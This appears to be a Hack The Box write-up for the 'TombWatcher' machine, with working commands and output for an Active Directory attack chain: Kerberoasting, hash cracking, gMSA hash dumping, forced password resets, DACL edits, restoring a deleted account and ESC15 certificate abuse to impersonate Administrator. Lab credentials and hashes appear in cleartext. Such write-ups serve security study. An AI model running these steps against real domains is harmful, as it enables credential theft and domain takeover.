## Nmap
```bash
nmap -sCV -p- -Pn -A --min-rate 5000 10.129.5.22 -oN nmap.log
```
```bash
Nmap scan report for 10.129.5.22
Host is up (0.25s latency).
Not shown: 65515 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-09 17:27:37Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-09T17:29:16+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-03-09T17:29:16+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-03-09T17:29:16+00:00; +4h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Not valid before: 2024-11-16T00:47:59
|_Not valid after:  2025-11-16T00:47:59
|_ssl-date: 2026-03-09T17:29:16+00:00; +4h00m00s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49666/tcp open  msrpc         Microsoft Windows RPC
49695/tcp open  msrpc         Microsoft Windows RPC
49696/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49698/tcp open  msrpc         Microsoft Windows RPC
49716/tcp open  msrpc         Microsoft Windows RPC
49733/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
| smb2-time: 
|   date: 2026-03-09T17:28:40
|_  start_date: N/A
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 3269/tcp)
HOP RTT       ADDRESS
1   245.33 ms 10.10.14.1
2   245.78 ms 10.129.5.22

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 149.32 seconds

```

Gathering Host Information
```bash
nxc smb 10.129.5.22 --generate-hosts-file hosts 
```
![[Pasted image 20260309223928.png]]

![[Pasted image 20260309224305.png]]

![[Pasted image 20260309224405.png]]

Use the given credentials
```
account: henry / H3nry_987TGV!
```


```bash
bloodhound-python -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -ns 10.129.5.22 -c All
```
```bash
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ bloodhound-python -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' -ns 10.129.5.22 -c All
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: tombwatcher.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc01.tombwatcher.htb
INFO: Found 9 users
INFO: Found 53 groups
INFO: Found 2 gpos
INFO: Found 2 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC01.tombwatcher.htb
ERROR: Unhandled exception in computer DC01.tombwatcher.htb processing: The NETBIOS connection with the remote host timed out.
INFO: Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 986, in non_polling_read
    received = self._sock.recv(bytes_left)
TimeoutError: timed out

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/lib/python3/dist-packages/bloodhound/enumeration/computers.py", line 136, in process_computer
    unresolved = c.rpc_get_group_members(580, c.psremote)
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 795, in rpc_get_group_members
    raise e
  File "/usr/lib/python3/dist-packages/bloodhound/ad/computer.py", line 741, in rpc_get_group_members
    resp = samr.hSamrEnumerateDomainsInSamServer(dce, serverHandle)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/samr.py", line 2504, in hSamrEnumerateDomainsInSamServer
    return dce.request(request)
           ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 861, in request
    answer = self.recv()
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/rpcrt.py", line 1316, in recv
    response_data = self._transport.recv(forceRecv, count=MSRPCRespHeader._SIZE)
  File "/usr/lib/python3/dist-packages/impacket/dcerpc/v5/transport.py", line 555, in recv
    return self.__smb_connection.readFile(self.__tid, self.__handle)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smbconnection.py", line 572, in readFile
    bytesRead = self._SMBConnection.read_andx(treeId, fileId, offset, toRead)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 2065, in read_andx
    return self.read(tid, fid, offset, max_size, wait_answer)
           ~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 1400, in read
    ans = self.recvSMB(packetID)
  File "/usr/lib/python3/dist-packages/impacket/smb3.py", line 515, in recvSMB
    data = self._NetBIOSSession.recv_packet(self._timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 917, in recv_packet
    data = self.__read(timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 1004, in __read
    data = self.read_function(4, timeout)
  File "/usr/lib/python3/dist-packages/impacket/nmb.py", line 988, in non_polling_read
    raise NetBIOSTimeout
impacket.nmb.NetBIOSTimeout: The NETBIOS connection with the remote host timed out.

INFO: Done in 00M 45S

```

Synchronize time with DC
```bash
sudo timedatectl set-ntp off
sudo rdate -n 10.129.5.22
```

![[Pasted image 20260309225535.png]]


Execute Kerveroasting

```bash
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ ./targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!'                        
[*] Starting kerberoast attacks
[*] Fetching usernames from Active Directory with LDAP
[VERBOSE] SPN added successfully for (Alfred)
[+] Printing hash for (Alfred)
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e0275a627514ef282f685068ea404991$9f5ee4b992904da3b7290dfec2f70eec4d111cfa51a4b086243add7932400543b41bd140237c3787470ec8a1056f2e4c97bea817470044664c3d7529089f912b92139961e50af4a88b1e7b6202d257f0493ea596f2d8883edb3754036d11488d6aced8f23dcbece7c3651a2dfd7a877cbe44a2182a244cc2c046310239436c84f8fde3120bb4cdbf23e3b64bcc653a6a6840400846c00c1bc9a478405bf9984a84e2cd60b914ae6a05824047641a1af86df1fe3b877e93ce81f009e507803b3f06e72aa96eb4711a7885c4d4877e00612854f0c61078f052387814c6215d26a77c51f12bddce4524f7a0dcc5155f5107d6b19f35d513c93e91509406714964bfd2aa39e816eb1d0fd3519e72f4db9c0cb1c8d045785cfb96727dcac603e19f2a4ba6f8f72dc5fb757d248e12110d9a63b8948ae468ca2db856b028f146463e9ca25456847347c1b998ced2e26d36474bd0e90b85a9fa815116ee4ae1673b1bf1b8b3185ae60faabdfcaf8ed96f2cbc14cf48f56b4842513f84a220c75650ccd1a94660e492ba1b4bf35e3aae9571f197d022b3786e6eb9b27e641d90c6fd1f51048573a82785be17783ad5f52f79ba33422b0ea1c3fd0677e7eefb97bf3c2dff6d9b622ca8166afcd805e27bd83061e37a79603e2a203493b7552a7632e5a9ada3d27e42d8bdf7fe6846e716d7022bddf78c1d21ef80c51651dfbd5c754c9d8492e3bda5f3b5cf06834895bb8ed79be6e54ccee8b55c001e0661ced1241f353ec2a76cae33d606d1327d6218e63737203fd0328be1c0b29f1ed8dac61bb096e10243b1aad6c99fe7419945c42fff6a907bb83e78f7cc40f40411e153da69ac59ac9d1e0667b51a4266249cc2e46ad43ef122b73f5dc81edd3dac2dab6bbf6ebf78226330da3e69e3b80d36e717e6e3a22000ec57dace71f11d78b09b1ae5fbabbb406b2be4f5741237fb659fcb6462c1d86f6befd93b1c3aabfc8db9632adf9537c879a29da369b27bdae1af25d75a4afd876c295d53ebb8e79a3c909812bcf025076464a950a3ec44bd48dfab9abed7dd59f6d0cddaef018171df2f3fac9e89371ee0217148f51e45e2d4f4572e19fafae01f70b4081fc3bd97b7a3cb40893f3d4b055898b0dfc1b3119e430d57b988b008121bc2db89b40c9cc154b8ef72207766b599753cd8cdae24556f6735985e4772fb73a658b82156ac7ee5002ba1b857241c688b4f7dbe89a1b862d848021fdd5e2789a4ed70fcb2068158e9232d69646fe0c5817c59742a201d1de1a15e1757cc14b293f7807c93aaa5600bd4cf9af5bf42d979c76b46b131d6bdf0a27e53a1aa3bd3395d9cb165ae1928ab2fe61d45d26e7de91b77e82a1c1bc43aa7b7e7ae386be2b239bec7f61d6d01a0ce789659fe9f6eb5ac2514a0fdae63a04c330a99be37571790c309a52e65fb201fca182b42756ae3a8bc299809ef8d1b9518f9f141b86237
[VERBOSE] SPN removed successfully for (Alfred)

```

Cracked Hash
Discovered Password 'basketball'
```bash
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --quiet 
$krb5tgs$23$*Alfred$TOMBWATCHER.HTB$tombwatcher.htb/Alfred*$e0275a627514ef282f685068ea404991$9f5ee4b992904da3b7290dfec2f70eec4d111cfa51a4b086243add7932400543b41bd140237c3787470ec8a1056f2e4c97bea817470044664c3d7529089f912b92139961e50af4a88b1e7b6202d257f0493ea596f2d8883edb3754036d11488d6aced8f23dcbece7c3651a2dfd7a877cbe44a2182a244cc2c046310239436c84f8fde3120bb4cdbf23e3b64bcc653a6a6840400846c00c1bc9a478405bf9984a84e2cd60b914ae6a05824047641a1af86df1fe3b877e93ce81f009e507803b3f06e72aa96eb4711a7885c4d4877e00612854f0c61078f052387814c6215d26a77c51f12bddce4524f7a0dcc5155f5107d6b19f35d513c93e91509406714964bfd2aa39e816eb1d0fd3519e72f4db9c0cb1c8d045785cfb96727dcac603e19f2a4ba6f8f72dc5fb757d248e12110d9a63b8948ae468ca2db856b028f146463e9ca25456847347c1b998ced2e26d36474bd0e90b85a9fa815116ee4ae1673b1bf1b8b3185ae60faabdfcaf8ed96f2cbc14cf48f56b4842513f84a220c75650ccd1a94660e492ba1b4bf35e3aae9571f197d022b3786e6eb9b27e641d90c6fd1f51048573a82785be17783ad5f52f79ba33422b0ea1c3fd0677e7eefb97bf3c2dff6d9b622ca8166afcd805e27bd83061e37a79603e2a203493b7552a7632e5a9ada3d27e42d8bdf7fe6846e716d7022bddf78c1d21ef80c51651dfbd5c754c9d8492e3bda5f3b5cf06834895bb8ed79be6e54ccee8b55c001e0661ced1241f353ec2a76cae33d606d1327d6218e63737203fd0328be1c0b29f1ed8dac61bb096e10243b1aad6c99fe7419945c42fff6a907bb83e78f7cc40f40411e153da69ac59ac9d1e0667b51a4266249cc2e46ad43ef122b73f5dc81edd3dac2dab6bbf6ebf78226330da3e69e3b80d36e717e6e3a22000ec57dace71f11d78b09b1ae5fbabbb406b2be4f5741237fb659fcb6462c1d86f6befd93b1c3aabfc8db9632adf9537c879a29da369b27bdae1af25d75a4afd876c295d53ebb8e79a3c909812bcf025076464a950a3ec44bd48dfab9abed7dd59f6d0cddaef018171df2f3fac9e89371ee0217148f51e45e2d4f4572e19fafae01f70b4081fc3bd97b7a3cb40893f3d4b055898b0dfc1b3119e430d57b988b008121bc2db89b40c9cc154b8ef72207766b599753cd8cdae24556f6735985e4772fb73a658b82156ac7ee5002ba1b857241c688b4f7dbe89a1b862d848021fdd5e2789a4ed70fcb2068158e9232d69646fe0c5817c59742a201d1de1a15e1757cc14b293f7807c93aaa5600bd4cf9af5bf42d979c76b46b131d6bdf0a27e53a1aa3bd3395d9cb165ae1928ab2fe61d45d26e7de91b77e82a1c1bc43aa7b7e7ae386be2b239bec7f61d6d01a0ce789659fe9f6eb5ac2514a0fdae63a04c330a99be37571790c309a52e65fb201fca182b42756ae3a8bc299809ef8d1b9518f9f141b86237:basketball

```

Successful smb authentication with acquired credentials
```bash
nxc smb 10.129.5.22 -u 'Alfred' -p 'basketball'
```
![[Pasted image 20260309231921.png]]

added INFRASTRUCTURE group
```bash
bloodyAD -d 'tombatcher.htb' -u 'Alfred' -p 'basketball' --host '10.129.5.22' add groupMember INFRASTRUCTURE Alfred
```
![[Pasted image 20260310085431.png]]


Obtained NTLM hash value using 'Alfred' account.
```
 Account: ansible_dev$         NTLM: 93f81a98d22217b6206d950528a4802e
```
```bash
nxc ldap dc01.tombwatcher.htb -u 'Alfred' -p 'basketball' --gmsa 
```
![[Pasted image 20260310085851.png]]

Smb authentication was successful using the acquired answerable_dev$ account.
```bash
nxc smb 10.129.5.22 -u 'ansible_dev$' -H '93f81a98d22217b6206d950528a4802e'
```
![[Pasted image 20260310090227.png]]

Changed password
```bash
bloodyAD --host 'dc01.tombwatcher.htb' -u 'ansible_dev$' -p ':93f81a98d22217b6206d950528a4802e' set password sam '1q2w3e4r'
```
![[Pasted image 20260310093607.png]]

SMB authentication was successful with the changed password.
```bash
nxc smb dc01.tombwatcher.htb -u 'sam' -p '1q2w3e4r'
```
![[Pasted image 20260310101502.png]]

chenged own
```bash
impacket-owneredit -action write -new-owner SAM -target JOHN tombwatcher.htb/SAM:'1q2w3e4r' -dc-ip 10.129.5.22 
```
![[Pasted image 20260310102742.png]]

Granted GenericAll
```bash
impacket-dacledit -action write -rights FullControl -principal SAM -target JOHN tombwatcher.htb/SAM:'1q2w3e4r' -dc-ip 10.129.5.22
```

![[Pasted image 20260310102916.png]]

SMB authentication was successful
```bash
net rpc password "JOHN" "1q2w3e4r" -U "tombwatcher.htb"/"SAM"%"1q2w3e4r" -S "DC01.tombwatcher.htb"
nxc smb 10.129.5.22 -u 'JOHN' -p '1q2w3e4r'

```

![[Pasted image 20260310103413.png]]

connected evil-winrm
```bash
evil-winrm -i 10.129.5.22 -u 'JOHN' -p '1q2w3e4r' 
```
![[Pasted image 20260310103545.png]]

Retrieved user.txt
![[Pasted image 20260310103653.png]]

## Privilege Escalation


certify AD 
```bash
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ certipy-ad find -u 'john' -p '1q2w3e4r' -target 10.129.5.22   
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[!] Failed to lookup object with SID 'S-1-5-21-1392491010-1358638721-2126982587-1111'
[*] Saving text output to '20260310103908_Certipy.txt'
[*] Wrote text output to '20260310103908_Certipy.txt'
[*] Saving JSON output to '20260310103908_Certipy.json'
[*] Wrote JSON output to '20260310103908_Certipy.json'

```

found a deleted cert-admin account.

```powershell
*Evil-WinRM* PS C:\Users\john\Documents> Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *


CanonicalName                   : tombwatcher.htb/Deleted Objects
CN                              : Deleted Objects
Created                         : 11/15/2024 7:01:41 PM
createTimeStamp                 : 11/15/2024 7:01:41 PM
Deleted                         : True
Description                     : Default container for deleted objects
DisplayName                     :
DistinguishedName               : CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {12/31/1600 7:00:00 PM}
instanceType                    : 4
isCriticalSystemObject          : True
isDeleted                       : True
LastKnownParent                 :
Modified                        : 11/15/2024 7:56:00 PM
modifyTimeStamp                 : 11/15/2024 7:56:00 PM
Name                            : Deleted Objects
ObjectCategory                  : CN=Container,CN=Schema,CN=Configuration,DC=tombwatcher,DC=htb
ObjectClass                     : container
ObjectGUID                      : 34509cb3-2b23-417b-8b98-13f0bd953319
ProtectedFromAccidentalDeletion :
sDRightsEffective               : 0
showInAdvancedViewOnly          : True
systemFlags                     : -1946157056
uSNChanged                      : 12851
uSNCreated                      : 5659
whenChanged                     : 11/15/2024 7:56:00 PM
whenCreated                     : 11/15/2024 7:01:41 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
CN                              : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
codePage                        : 0
countryCode                     : 0
Created                         : 11/15/2024 7:55:59 PM
createTimeStamp                 : 11/15/2024 7:55:59 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/15/2024 7:56:05 PM, 11/15/2024 7:56:02 PM, 12/31/1600 7:00:01 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/15/2024 7:57:59 PM
modifyTimeStamp                 : 11/15/2024 7:57:59 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : f80369c8-96a2-4a7f-a56c-9c15edd7d1e3
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1109
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133761921597856970
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 12975
uSNCreated                      : 12844
whenChanged                     : 11/15/2024 7:57:59 PM
whenCreated                     : 11/15/2024 7:55:59 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
CN                              : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:04:05 PM
createTimeStamp                 : 11/16/2024 12:04:05 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:c1f1f0fe-df9c-494c-bf05-0679e181b358,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:04:18 PM, 11/16/2024 12:04:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:04:21 PM
modifyTimeStamp                 : 11/16/2024 12:04:21 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:c1f1f0fe-df9c-494c-bf05-0679e181b358
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : c1f1f0fe-df9c-494c-bf05-0679e181b358
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1110
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762502455822446
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13171
uSNCreated                      : 13161
whenChanged                     : 11/16/2024 12:04:21 PM
whenCreated                     : 11/16/2024 12:04:05 PM

accountExpires                  : 9223372036854775807
badPasswordTime                 : 0
badPwdCount                     : 0
CanonicalName                   : tombwatcher.htb/Deleted Objects/cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
CN                              : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
codePage                        : 0
countryCode                     : 0
Created                         : 11/16/2024 12:07:04 PM
createTimeStamp                 : 11/16/2024 12:07:04 PM
Deleted                         : True
Description                     :
DisplayName                     :
DistinguishedName               : CN=cert_admin\0ADEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf,CN=Deleted Objects,DC=tombwatcher,DC=htb
dSCorePropagationData           : {11/16/2024 12:07:10 PM, 11/16/2024 12:07:08 PM, 12/31/1600 7:00:00 PM}
givenName                       : cert_admin
instanceType                    : 4
isDeleted                       : True
LastKnownParent                 : OU=ADCS,DC=tombwatcher,DC=htb
lastLogoff                      : 0
lastLogon                       : 0
logonCount                      : 0
Modified                        : 11/16/2024 12:07:27 PM
modifyTimeStamp                 : 11/16/2024 12:07:27 PM
msDS-LastKnownRDN               : cert_admin
Name                            : cert_admin
                                  DEL:938182c3-bf0b-410a-9aaa-45c8e1a02ebf
nTSecurityDescriptor            : System.DirectoryServices.ActiveDirectorySecurity
ObjectCategory                  :
ObjectClass                     : user
ObjectGUID                      : 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
objectSid                       : S-1-5-21-1392491010-1358638721-2126982587-1111
primaryGroupID                  : 513
ProtectedFromAccidentalDeletion : False
pwdLastSet                      : 133762504248946345
sAMAccountName                  : cert_admin
sDRightsEffective               : 7
sn                              : cert_admin
userAccountControl              : 66048
uSNChanged                      : 13197
uSNCreated                      : 13186
whenChanged                     : 11/16/2024 12:07:27 PM
whenCreated                     : 11/16/2024 12:07:04 PM

```
Deleted Account Recovery
```powershell
Restore-ADObject -Identity 938182c3-bf0b-410a-9aaa-45c8e1a02ebf
Get-ADUser cert_admin
```
![[Pasted image 20260310110356.png]]

Reset account password 

```powershell
Set-ADAccountPassword cert_admin -NewPassword (ConvertTo-SecureString 'a123a123' -AsPlainText -Force)
```

SMB authentication was successful
```bash
nxc smb dc01.tombwatcher.htb -u cert_admin -p 'a123a123'  
```
![[Pasted image 20260310132615.png]]



Setting fake SPN 
```powershell
Set-ADUser -Identity cert_admin -ServicePrincipalNames @{Add="ghost/tombwatcher.htb"}
```


certipy-ad 를 사용하여 취약점 스캔
```bash
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ certipy-ad find -u 'cert_admin' -p 'a123a123' -target 10.129.232.167 -dc-ip 10.129.232.167 -vulnerable -stdout
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Finding certificate templates
[*] Found 33 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 11 enabled certificate templates
[*] Finding issuance policies
[*] Found 13 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'tombwatcher-CA-1' via RRP
[!] Failed to connect to remote registry. Service should be starting now. Trying again...
[*] Successfully retrieved CA configuration for 'tombwatcher-CA-1'
[*] Checking web enrollment for CA 'tombwatcher-CA-1' @ 'DC01.tombwatcher.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : tombwatcher-CA-1
    DNS Name                            : DC01.tombwatcher.htb
    Certificate Subject                 : CN=tombwatcher-CA-1, DC=tombwatcher, DC=htb
    Certificate Serial Number           : 3428A7FC52C310B2460F8440AA8327AC
    Certificate Validity Start          : 2024-11-16 00:47:48+00:00
    Certificate Validity End            : 2123-11-16 00:57:48+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : TOMBWATCHER.HTB\Administrators
      Access Rights
        ManageCa                        : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        ManageCertificates              : TOMBWATCHER.HTB\Administrators
                                          TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Enroll                          : TOMBWATCHER.HTB\Authenticated Users
Certificate Templates
  0
    Template Name                       : WebServer
    Display Name                        : Web Server
    Certificate Authorities             : tombwatcher-CA-1
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : False
    Any Purpose                         : False
    Enrollee Supplies Subject           : True
    Certificate Name Flag               : EnrolleeSuppliesSubject
    Extended Key Usage                  : Server Authentication
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 1
    Validity Period                     : 2 years
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-16T00:57:49+00:00
    Template Last Modified              : 2024-11-16T17:07:26+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
      Object Control Permissions
        Owner                           : TOMBWATCHER.HTB\Enterprise Admins
        Full Control Principals         : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Owner Principals          : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Dacl Principals           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
        Write Property Enroll           : TOMBWATCHER.HTB\Domain Admins
                                          TOMBWATCHER.HTB\Enterprise Admins
                                          TOMBWATCHER.HTB\cert_admin
    [+] User Enrollable Principals      : TOMBWATCHER.HTB\cert_admin
    [!] Vulnerabilities
      ESC15                             : Enrollee supplies subject and schema version is 1.
    [*] Remarks
      ESC15                             : Only applicable if the environment has not been patched. See CVE-2024-49019 or the wiki for more details.

```

```bash
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ certipy-ad req \
    -u 'cert_admin@tombwatcher.htb' -p 'a123a123' \
    -dc-ip '10.129.232.167' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'WebServer' \
    -application-policies 'Certificate Request Agent'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate without identity
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'cert_admin.pfx'
[*] Wrote certificate and private key to 'cert_admin.pfx'
                                                                                                                   
┌──(kali㉿kali)-[~/HTB/TombWatcher]
└─$ certipy-ad req \
    -u 'cert_admin' -p 'a123a123' \
    -dc-ip '10.129.232.167' -target 'DC01.tombwatcher.htb' \
    -ca 'tombwatcher-CA-1' -template 'User' \
    -pfx 'cert_admin.pfx' -on-behalf-of 'tombwatcher\Administrator'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 4
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator@tombwatcher.htb'
[*] Certificate object SID is 'S-1-5-21-1392491010-1358638721-2126982587-500'
